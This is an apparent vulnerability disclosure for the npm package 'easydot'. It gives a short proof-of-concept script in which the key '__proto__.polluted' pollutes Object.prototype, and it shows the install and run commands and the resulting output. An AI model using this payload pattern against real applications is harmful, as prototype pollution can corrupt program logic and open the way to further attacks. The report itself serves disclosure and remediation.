# Description

`easydot` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var easydot = require("easydot")
var obj = {}
const easy = easydot(obj);
console.log("Before : " + {}.polluted);
easy['__proto__.polluted']= 'Yes! Its Polluted';
console.log("After : " + {}.polluted)
```


2. Execute the following commands in terminal:

```
npm i easydot # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
``` 
